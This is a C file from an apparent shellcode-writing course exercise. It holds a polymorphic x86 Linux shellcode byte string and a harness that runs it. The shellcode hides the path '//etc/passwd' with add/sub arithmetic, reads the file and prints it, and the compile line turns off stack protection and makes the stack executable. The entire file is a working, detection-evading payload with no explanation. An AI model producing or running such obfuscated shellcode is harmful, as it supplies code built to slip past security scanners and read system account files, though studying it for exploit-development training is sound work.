/*
Filename:      shellcode-polymorphic.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  05.12.2018
Note:          x86 code but compiled on x64
Compiler:      gcc -m32 -ggdb -fno-stack-protector -z execstack shellcode-polymorphic.c -o shellcode-polymorphic
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x62\x62\x66\x53\x81\x04\x24\x11\x11\x11\x11\x68\x85\x51\x92\x83\x81\x2c\x24\x22\x22\x22\x22\x68\xfc\xfb\x31\x41\x81\x04\x24\x33\x33\x33\x33\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
